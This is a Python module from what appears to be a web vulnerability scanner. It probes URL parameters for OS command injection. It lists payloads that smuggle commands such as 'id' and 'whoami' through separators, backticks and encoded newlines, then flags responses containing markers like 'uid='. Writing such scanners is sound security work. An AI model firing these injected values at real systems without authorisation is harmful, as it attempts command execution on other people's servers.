"""
cmd_injection.py - OS command injection probe.

Injects command separators and checks if command output appears
in the response body.
"""
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from urllib.parse import urlparse, urlencode, urlunparse
from modules.explain import get_explanation
from utils.logger import get_logger

log = get_logger(__name__)

# Command injection payloads — use safe read-only commands
CMD_PAYLOADS = [
    ";id",
    "|id",
    "||id",
    "&&id",
    "`id`",
    "$(id)",
    ";whoami",
    "|whoami",
    "||whoami",
    ";echo pendo_cmdi_test",
    "|echo pendo_cmdi_test",
    "$(echo pendo_cmdi_test)",
    "`echo pendo_cmdi_test`",
    "\nid\n",
    "%0aid%0a",
    "%0a/usr/bin/id%0a",
]

# Indicators that command execution occurred
CMD_INDICATORS = [
    "uid=",
    "gid=",
    "groups=",
    "root",
    "www-data",
    "apache",
    "nginx",
    "pendo_cmdi_test",
]


def probe_cmd_injection(endpoints, requester, explain=False):
    """
    Inject command injection payloads into all parameters.
    Returns a list of issue dicts.
    """
    issues = []
    confirmed = set()

    for ep in endpoints:
        url = ep["url"]
        params = ep.get("params", {})
        if not params:
            continue

        for param in params:
            for payload in CMD_PAYLOADS:
                injected = dict(params)
                injected[param] = str(params[param]) + payload
                parsed = urlparse(url)
                probe_url = urlunparse(parsed._replace(query=urlencode(injected)))

                try:
                    resp = requester._session.get(
                        probe_url, timeout=8, verify=False, allow_redirects=False
                    )
                    body = resp.text

                    for indicator in CMD_INDICATORS:
                        if indicator in body:
                            key = f"{url}:{param}"
                            if key in confirmed:
                                break
                            confirmed.add(key)

                            issue = {
                                "type": "Command Injection",
                                "endpoint": url,
                                "param": param,
                                "payload": payload,
                                "risk": "Critical",
                                "detail": f"Response contains command output: '{indicator}'",
                                "confidence": "High",
                            }
                            if explain:
                                issue["reason"] = get_explanation("cmd_injection")
                            issues.append(issue)
                            log.debug(f"Command injection confirmed: {url} param={param}")
                            break

                except Exception:
                    pass

    return issues
